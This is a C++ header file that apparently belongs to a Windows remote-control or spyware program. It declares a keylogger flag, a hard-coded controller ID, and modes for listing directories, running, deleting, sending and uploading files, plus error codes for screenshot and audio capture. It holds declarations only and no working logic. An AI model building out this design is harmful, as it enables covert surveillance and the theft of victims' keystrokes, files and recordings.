#ifndef GLOBALS_H
#define GLOBALS_H

#include <windows.h>
#include <mmsystem.h>
#include <fstream>
#include <iostream>

#pragma comment(lib, "winmm.lib")

extern std::atomic<bool> isKeyLoggerRunning;
extern bool isConversationRunning;
extern const int64_t sashaId;

enum class Mode {
	STANDARD,
	CHECK_DIR,
	FULL_CHECK_DIR,
	START_FILE,
	DELETE_FILE,
	COPY_FILE,
	SEND_FILE,
	UPLOAD_FILE,
	CONVERSATION,
	PLAY_MUSIC,
};

enum class COE {
	Success,
	EmptyInput,
	EmptyDirectory,
	PathNotFound,
	NotADirectory,
	ConversionError,
	FilesystemError,
	UnexpectedError,
	ExecutionError,
	UnknownError,
	OpenFileError,
	LimitError,
	NotARegularFile,
	RemoveFileError,
	NotAFile,
	TakeScreenshotError,
	RecordAudioError,
};

enum class ResponseType {
	Text,
	Path,
	None
};

// If code == Success -> returning target information to handleResult() (text or path to file)
// Else -> returning code + errorDetails to handleResult()
struct Result {
	COE code;						// Function's code of end
	std::string errorDetails;		// Details of error (if there is)
	ResponseType response_type;		// Type of response
	std::string response;			// Target response
};

extern const std::string klFileName;
extern const std::string cdFileName;
extern const std::string audioFileName;
extern Mode currentMode;
extern bool isWaitingForFile;
extern bool isMusicPlaying;

extern size_t totalFileNumber;
extern size_t totalFileNameLength;
extern uint64_t totalFileSize;

extern std::string tempPath;
void initTempPath();

#endif